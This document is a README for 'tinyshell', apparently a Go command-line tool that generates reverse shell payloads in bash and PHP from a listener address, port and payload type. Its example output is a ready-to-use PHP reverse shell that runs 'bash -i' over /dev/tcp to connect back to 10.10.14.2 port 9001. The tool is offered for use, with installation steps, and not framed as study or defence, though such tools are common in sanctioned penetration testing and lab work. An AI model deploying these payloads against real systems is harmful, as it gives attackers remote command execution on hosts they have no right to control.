# tinyshell 🐚
```
NAME:
   tinyshell - generate reverse shell payloads!

USAGE:
   tinyshell

OPTIONS:
   --port string, -p string     set the port on the listener
   --address string, -a string  set the address the shell should connect to
   --type string, -t string     payload type
   --help, -h                   show help

```

-----

## Installation
tinyshell runs on Windows, MacOS, and of course, Linux. 

v1 will include the ability to install via package managers like apt and yum. However, each release includes binaries for the above supported OS's. 

### Binary
Install the latest binary for your target architecture from the [releases page](https://github.com/OtterWiz/tinyshell/releases) 
### Go
Have Go installed? Well here you *go*:

```bash
go install github.com/OtterWiz/tinyshell@latest
```



-----

## Usage

The tool requires three flags to generate a payload: address, port, and type.

Example: `tinyShell --port 9001 --address 10.10.10.10 --type php`

### Supported Payloads (so far...)

  * `bash`
  * `php`

-----

## Examples

### 1\. Generating a PHP Payload
To generate a PHP reverse shell payload that connects to `10.10.14.2` on port `9001`:

To generate a PHP reverse shell payload for the same listener:

**Command:**

```bash
tinyshell -a 10.10.14.2 -p 9001 -t php
```

**Output:**

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1'");
```